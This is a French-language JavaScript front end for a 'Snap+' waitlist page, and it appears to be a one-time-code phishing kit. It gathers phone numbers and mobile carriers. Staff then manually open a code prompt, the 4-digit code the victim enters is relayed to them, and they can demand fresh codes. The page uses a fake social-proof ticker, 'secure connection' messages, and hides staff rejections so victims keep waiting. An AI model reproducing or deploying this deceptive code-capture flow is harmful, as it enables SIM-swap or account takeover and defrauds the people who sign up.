/*
 * Snap+ - site public (FR)
 * Après envoi : animation « en attente » jusqu'à ce que le staff clique Verify.
 * Code 4 chiffres ; contact = numéro de téléphone.
 */

(function () {
  'use strict';

  // sessionStorage for active tab only (Verify can switch UI). Close tab = start over.
  const TOKEN_KEY = 'snapple_apply_token';
  const PROOF_NAMES = ['Elo***', 'Luc***', 'Mar***', 'Cam***', 'Noa***', 'Zoé***', 'Tom***', 'Léa***'];
  const PROOF_INTERVAL_MS = 3500;
  const PROOF_FADE_MS = 400;

  const PENDING_MSGS = [
    'Préparation de votre demande...',
    'Mise en file d\'attente de l\'équipe...',
    'En attente qu\'un agent prenne en charge votre dossier...',
    'Le code de vérification sera envoyé sous peu...',
    'Veuillez patienter, ne fermez pas cette page...',
    'Connexion sécurisée en cours...',
  ];

  const FAQ_ITEMS = [
    {
      q: "Qu'est-ce que Snap+ ?",
      a: "Snap+ est une application de moments, avec badges exclusifs, insights de stories et boost de score.",
    },
    {
      q: 'Comment fonctionne la vérification ?',
      a: "Après votre inscription, un agent ouvre la saisie du code. Entrez le code à 4 chiffres reçu. L'équipe confirme ensuite manuellement.",
    },
    {
      q: "L'accès est-il payant ?",
      a: "Rien n'est facturé lors de l'inscription sur cette page.",
    },
    {
      q: "Besoin d'aide ?",
      a: 'Contactez le support avec le numéro utilisé pour votre demande.',
    },
  ];

  let selectedRole = '';
  let pollTimer = null;
  let pendingMsgTimer = null;
  let applyToken = '';
  let lastStatus = '';
  let lastOtpInvalid = false;
  let otpFieldClearedOnce = false;

  function $(id) {
    return document.getElementById(id);
  }

  function show(el) {
    if (el) el.hidden = false;
  }

  function hide(el) {
    if (el) el.hidden = true;
  }

  function setView(name) {
    ['home-view', 'faq-view', 'status-view', 'apply-view'].forEach((id) => {
      const el = $(id);
      if (el) el.classList.add('hidden');
    });
    const target = $(name === 'apply' ? 'apply-view' : name + '-view');
    if (target) target.classList.remove('hidden');
  }

  function cleanName(raw) {
    return String(raw || '').replace(/^@+/, '').replace(/\s/g, '').trim().toLowerCase();
  }

  function isValidUsername(name) {
    if (!name || name.length < 2) return false;
    // Slash not allowed in username
    if (name.indexOf('/') !== -1 || name.indexOf('\\') !== -1) return false;
    return true;
  }

  /** Normalize FR phone: any 10-digit number starting with 0 (01-09), or null */
  function normalizePhone(raw) {
    let d = String(raw || '').replace(/\D/g, '');
    if (d.startsWith('33') && d.length >= 11) d = '0' + d.slice(2);
    if (d.length === 9 && d[0] >= '1' && d[0] <= '9') d = '0' + d;
    if (d.length === 10 && d[0] === '0' && d[1] >= '1' && d[1] <= '9') return d;
    return null;
  }

  function formatPhoneDisplay(digits) {
    const d = normalizePhone(digits) || String(digits || '').replace(/\D/g, '');
    if (d.length !== 10) return d;
    return d.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  }

  function isValidPhone(raw) {
    return !!normalizePhone(raw);
  }

  function updateCta() {
    const btn = $('continue-btn');
    if (!btn) return;
    const name = cleanName($('display-name') && $('display-name').value);
    const phone = $('phone') && $('phone').value.trim();
    btn.disabled = !(isValidUsername(name) && isValidPhone(phone) && selectedRole);
  }

  function clearFieldErrors() {
    ['err-name', 'err-phone', 'err-role', 'err-verify'].forEach((id) => {
      const el = $(id);
      if (el) {
        el.textContent = '';
        hide(el);
      }
    });
    const fe = $('form-error');
    if (fe) {
      fe.textContent = '';
      hide(fe);
    }
  }

  function initProofTicker() {
    const slide = $('proof-slide');
    const nameEl = $('proof-name');
    if (!slide || !nameEl) return;
    let i = 0;
    setInterval(() => {
      slide.classList.add('is-out');
      setTimeout(() => {
        i = (i + 1) % PROOF_NAMES.length;
        nameEl.textContent = PROOF_NAMES[i];
        slide.classList.remove('is-out');
      }, PROOF_FADE_MS);
    }, PROOF_INTERVAL_MS);
  }

  function initRoles() {
    const ops = document.querySelector('.operators');
    if (!ops) return;
    // Single delegated handler - snappier than per-button listeners
    ops.addEventListener('click', (e) => {
      const btn = e.target.closest('.op-btn[data-role]');
      if (!btn) return;
      e.preventDefault();
      ops.querySelectorAll('.op-btn.is-active').forEach((b) => b.classList.remove('is-active'));
      btn.classList.add('is-active');
      selectedRole = btn.getAttribute('data-role') || '';
      updateCta();
    });
  }

  function initFaq() {
    const list = $('faq-list');
    if (!list) return;
    FAQ_ITEMS.forEach((item) => {
      const wrap = document.createElement('div');
      wrap.className = 'faq-item';
      const q = document.createElement('button');
      q.type = 'button';
      q.className = 'faq-q';
      q.innerHTML =
        '<span></span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>';
      q.querySelector('span').textContent = item.q;
      const a = document.createElement('div');
      a.className = 'faq-a';
      a.textContent = item.a;
      q.addEventListener('click', () => {
        const open = wrap.classList.contains('is-open');
        list.querySelectorAll('.faq-item').forEach((el) => el.classList.remove('is-open'));
        if (!open) wrap.classList.add('is-open');
      });
      wrap.appendChild(q);
      wrap.appendChild(a);
      list.appendChild(wrap);
    });
  }

  function startPendingMessages() {
    if (pendingMsgTimer) clearInterval(pendingMsgTimer);
    const el = $('pending-msg');
    if (!el) return;
    let i = 0;
    const phone = ($('apply-phone') && $('apply-phone').textContent) || '';
    const render = () => {
      const base = PENDING_MSGS[i % PENDING_MSGS.length];
      el.innerHTML = base + (phone ? '<br><strong>' + phone + '</strong>' : '');
      i += 1;
    };
    render();
    pendingMsgTimer = setInterval(render, 2800);
  }

  function stopPendingMessages() {
    if (pendingMsgTimer) {
      clearInterval(pendingMsgTimer);
      pendingMsgTimer = null;
    }
  }

  function contactOf(app) {
    return app.phone || app.email || '';
  }

function saveToken(token) {
    applyToken = token || '';
    try {
      if (applyToken) sessionStorage.setItem(TOKEN_KEY, applyToken);
      else sessionStorage.removeItem(TOKEN_KEY);
    } catch (_) {}
  }

  function loadToken() {
    try {
      return sessionStorage.getItem(TOKEN_KEY) || applyToken || '';
    } catch (_) {
      return applyToken || '';
    }
  }

  function showApplyUI(app) {
    if (!app) return;
    setView('apply');
    saveToken(app.token);

    const phoneDisp = formatPhoneDisplay(contactOf(app));
    if ($('apply-name')) $('apply-name').textContent = app.display_name || '';
    if ($('apply-phone')) $('apply-phone').textContent = phoneDisp || '-';
    if ($('verify-phone-label')) $('verify-phone-label').textContent = phoneDisp || '-';

    const waiting = $('apply-waiting');
    const verify = $('apply-verify');
    const codeSent = $('apply-code-sent');
    const done = $('apply-done');
    [waiting, verify, codeSent, done].forEach((el) => {
      if (!el) return;
      el.classList.add('hidden');
      el.style.display = 'none';
    });

    const status = String(app.status || '');
    lastStatus = status;

    // Staff sent code -> show code entry (needs_code flag or status)
    if (status === 'awaiting_code' || app.needs_code) {
      stopPendingMessages();
      if (verify) {
        verify.classList.remove('hidden');
        verify.style.display = 'block';
      }
      // Re-Send Code: previous OTP is invalid — French message
      const otpHint = $('otp-invalid-msg');
      const otpInvalid = !!(app.otp_invalid || app.otp_message);
      if (otpHint) {
        if (otpInvalid) {
          otpHint.textContent =
            app.otp_message ||
            "Le code OTP précédent n'est plus valide. Veuillez saisir le nouveau code de vérification.";
          otpHint.hidden = false;
          otpHint.style.display = 'block';
        } else {
          otpHint.hidden = true;
          otpHint.style.display = 'none';
        }
      }
      // Clear digits ONLY ONCE when resend is first detected (not on every poll)
      if (otpInvalid && !otpFieldClearedOnce && $('verify-code')) {
        $('verify-code').value = '';
        otpFieldClearedOnce = true;
      }
      if (!otpInvalid) {
        otpFieldClearedOnce = false;
      }
      lastOtpInvalid = otpInvalid;
      startPolling();
      return;
    }

    if (status === 'code_submitted' || app.code_sent_to_staff) {
      stopPendingMessages();
      if (codeSent) {
        codeSent.classList.remove('hidden');
        codeSent.style.display = 'block';
      }
      startPolling();
      return;
    }

    if (status === 'pending' || status === 'offered' || status === 'claimed') {
      if (waiting) {
        waiting.classList.remove('hidden');
        waiting.style.display = 'block';
      }
      startPendingMessages();
      startPolling();
      return;
    }

    stopPendingMessages();

    if (status === 'approved') {
      if (done) {
        done.classList.remove('hidden');
        done.style.display = 'block';
      }
      if ($('apply-done-title')) $('apply-done-title').textContent = 'Bienvenue !';
      if ($('apply-done-text')) {
        $('apply-done-text').textContent =
          'Votre numéro a été accepté. Votre place est confirmée. Bienvenue sur Snap+.';
      }
      if ($('apply-done-pill')) {
        $('apply-done-pill').textContent = 'Approuvé';
        $('apply-done-pill').className = 'status-pill ok';
      }
      try {
        sessionStorage.removeItem(TOKEN_KEY);
      } catch (_) {}
      if (pollTimer) {
        clearInterval(pollTimer);
        pollTimer = null;
      }
      return;
    }

    // Staff "reject" is remapped to pending server-side — never show Rejeté.
    // Only permanent blacklist is a closed state on the public site.
    if (status === 'blacklisted') {
      if (done) {
        done.classList.remove('hidden');
        done.style.display = 'block';
      }
      if ($('apply-done-title')) $('apply-done-title').textContent = 'Demande clôturée';
      if ($('apply-done-text')) {
        $('apply-done-text').textContent =
          'Cette demande n’est plus active.';
      }
      if ($('apply-done-pill')) {
        $('apply-done-pill').textContent = 'Clôturé';
        $('apply-done-pill').className = 'status-pill bad';
      }
      try {
        sessionStorage.removeItem(TOKEN_KEY);
      } catch (_) {}
      if (pollTimer) {
        clearInterval(pollTimer);
        pollTimer = null;
      }
      return;
    }

    // Legacy rejected rows (if any) keep waiting UI — number is re-queued for staff
    if (status === 'rejected') {
      if (waiting) {
        waiting.classList.remove('hidden');
        waiting.style.display = 'block';
      }
      startPendingMessages();
      startPolling();
      return;
    }

    if (waiting) {
      waiting.classList.remove('hidden');
      waiting.style.display = 'block';
    }
    startPendingMessages();
    startPolling();
  }

  async function pollOnce() {
    const token = loadToken();
    if (!token) return;
    applyToken = token;
    try {
      const res = await fetch('/api/apply/' + encodeURIComponent(token) + '?_=' + Date.now(), {
        cache: 'no-store',
      });
      if (!res.ok) return;
      const data = await res.json();
      if (!data.application) return;
      const st = String(data.application.status || '');
      const otpInvalid = !!(data.application.otp_invalid || data.application.otp_message);
      // Refresh when status changes, first time code is needed, or resend just flagged
      // Do NOT re-render every poll while typing OTP (that was wiping digits)
      const needVerify =
        (st === 'awaiting_code' || data.application.needs_code) &&
        lastStatus !== 'awaiting_code' &&
        lastStatus !== st;
      const resendJustHappened = otpInvalid && !lastOtpInvalid;
      if (st !== lastStatus || needVerify || resendJustHappened) {
        showApplyUI(data.application);
      } else if (otpInvalid && lastOtpInvalid) {
        // keep French warning visible without touching the input
        const otpHint = $('otp-invalid-msg');
        if (otpHint) {
          otpHint.textContent =
            data.application.otp_message ||
            "Le code OTP précédent n'est plus valide. Veuillez saisir le nouveau code de vérification.";
          otpHint.hidden = false;
          otpHint.style.display = 'block';
        }
      }
    } catch (_) {}
  }

  function startPolling() {
    if (pollTimer) clearInterval(pollTimer);
    if (!loadToken()) return;
    pollOnce();
    pollTimer = setInterval(pollOnce, 6000);
  }

  function formatPhoneAsYouType(raw) {
    let d = String(raw || '').replace(/\D/g, '').slice(0, 10);
    // Keep leading 0 for local FR display
    const parts = d.match(/.{1,2}/g);
    return parts ? parts.join(' ') : '';
  }

  function initForm() {
    const form = $('waitlist-form');
    const nameInput = $('display-name');
    const phoneInput = $('phone');
    if (!form) return;

    if (nameInput) nameInput.addEventListener('input', updateCta);
    if (phoneInput) {
      phoneInput.addEventListener('input', () => {
        const caretEnd = phoneInput.selectionStart === phoneInput.value.length;
        phoneInput.value = formatPhoneAsYouType(phoneInput.value);
        if (caretEnd) phoneInput.selectionStart = phoneInput.selectionEnd = phoneInput.value.length;
        updateCta();
      });
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      clearFieldErrors();

      const name = cleanName(nameInput && nameInput.value);
      const phone = normalizePhone(phoneInput && phoneInput.value);
      const btn = $('continue-btn');

      let ok = true;
      if (name.length < 2) {
        const err = $('err-name');
        if (err) {
          err.textContent = 'Choisissez un pseudo (2 caractères min.).';
          show(err);
        }
        ok = false;
      } else if (name.indexOf('/') !== -1 || name.indexOf('\\') !== -1) {
        const err = $('err-name');
        if (err) {
          err.textContent = 'Le pseudo ne peut pas contenir le caractère « / ».';
          show(err);
        }
        ok = false;
      }
      if (!phone) {
        const err = $('err-phone');
        if (err) {
          err.textContent = 'Entrez un numéro français valide (10 chiffres).';
          show(err);
        }
        ok = false;
      }
      if (!selectedRole) {
        const err = $('err-role');
        if (err) {
          err.textContent = 'Choisissez un opérateur (SFR, Bouygues ou Orange).';
          show(err);
        }
        ok = false;
      }
      if (!ok) return;

      if (btn) {
        btn.disabled = true;
        btn.setAttribute('aria-busy', 'true');
        btn.textContent = 'Envoi...';
      }
      try {
        const payload = {
          event_type: 'waitlist_signup',
          display_name: name,
          phone,
          role: selectedRole,
          message: "Inscription liste d'attente",
        };
        const res = await fetch('/api/apply', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
          const fe = $('form-error');
          if (fe) {
            let msg = data.message || data.error || 'Impossible d’envoyer la demande.';
            if (data.error === 'requests_paused' || res.status === 503) {
              msg =
                data.message ||
                'Les inscriptions sont temporairement suspendues. Réessayez plus tard.';
            } else if (data.error === 'rate_limited' || res.status === 429) {
              msg =
                data.message ||
                'Une seule demande par minute par adresse IP. Réessayez plus tard.';
            } else if (data.error === 'banned_keyword') {
              msg = data.message || "Ce pseudo n'est pas autorisé.";
              const err = $('err-name');
              if (err) {
                err.textContent = msg;
                show(err);
              }
            } else if (data.error === 'ip_blacklisted') {
              msg = data.message || 'Accès refusé depuis cette adresse IP.';
            } else if (data.error === 'Ce numéro ne peut pas rejoindre.' || res.status === 403) {
              msg = data.error || data.message || 'Ce numéro ne peut pas rejoindre.';
            }
            fe.textContent = msg;
            show(fe);
          }
          return;
        }
        if (data.application) showApplyUI(data.application);
        else if (data.token) {
          try {
            sessionStorage.setItem(TOKEN_KEY, data.token);
          } catch (_) {}
          applyToken = data.token;
          startPolling();
        }
      } catch (_) {
        const fe = $('form-error');
        if (fe) {
          fe.textContent = 'Erreur réseau. Réessayez dans un instant.';
          show(fe);
        }
      } finally {
        if (btn) {
          btn.removeAttribute('aria-busy');
          btn.innerHTML =
            'Continuer <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>';
        }
        updateCta();
      }
    });
  }

  function initVerifyForm() {
    const form = $('verify-form');
    if (!form) return;
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const err = $('err-verify');
      if (err) {
        err.textContent = '';
        hide(err);
      }
      let code = ($('verify-code') && $('verify-code').value.trim()) || '';
      code = code.replace(/\D/g, '').slice(0, 4);
      if (!code || code.length < 1 || !applyToken) {
        if (err) {
          err.textContent = 'Entrez le code à 4 chiffres maximum.';
          show(err);
        }
        return;
      }
      const btn = $('verify-submit');
      if (btn) btn.disabled = true;
      try {
        const res = await fetch('/api/apply/' + encodeURIComponent(applyToken) + '/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
          if (err) {
            err.textContent = data.error || 'Impossible d’envoyer le code';
            show(err);
          }
          return;
        }
        showApplyUI(data.application);
      } catch (_) {
        if (err) {
          err.textContent = 'Erreur réseau';
          show(err);
        }
      } finally {
        if (btn) btn.disabled = false;
      }
    });
  }

  function initStatus() {
    const form = $('status-form');
    if (!form) return;
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const err = $('status-error');
      const result = $('status-result');
      if (err) {
        err.textContent = '';
        hide(err);
      }
      if (result) {
        result.innerHTML = '';
        result.classList.add('hidden');
      }
      const phone = normalizePhone($('status-phone') && $('status-phone').value);
      if (!phone) {
        if (err) {
          err.textContent = 'Entrez un numéro français valide (10 chiffres).';
          show(err);
        }
        return;
      }
      if (result) {
        result.innerHTML =
          'Gardez cette page ouverte après votre inscription pour suivre le statut. Si vous l’avez fermée, recommencez le formulaire depuis le début.';
        result.classList.remove('hidden');
      }
    });
  }

  function initNav() {
    if ($('faq-btn')) $('faq-btn').addEventListener('click', () => setView('faq'));
    if ($('status-btn')) $('status-btn').addEventListener('click', () => setView('status'));
    if ($('faq-back')) $('faq-back').addEventListener('click', () => setView('home'));
    if ($('status-back')) $('status-back').addEventListener('click', () => setView('home'));
  }

  function trackPageview() {
    fetch('/api/events/pageview', { method: 'POST' }).catch(() => {});
  }

document.addEventListener('DOMContentLoaded', () => {
    // Drop old permanent storage (full close of browser/tab still starts over via sessionStorage)
    try {
      localStorage.removeItem('snapple_apply_token');
      localStorage.removeItem('snapple_waitlist');
    } catch (_) {}

    initProofTicker();
    initRoles();
    initFaq();
    initForm();
    initVerifyForm();
    initStatus();
    initNav();
    updateCta();
    trackPageview();

    // Resume only within same browser tab (so Verify from staff can switch this page)
    const existing = loadToken();
    if (existing) {
      applyToken = existing;
      pollOnce();
      startPolling();
    }

    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') pollOnce();
    });
    window.addEventListener('focus', pollOnce);

    const codeInput = $('verify-code');
    if (codeInput) {
      codeInput.addEventListener('input', () => {
        codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 4);
      });
    }
  });
})();
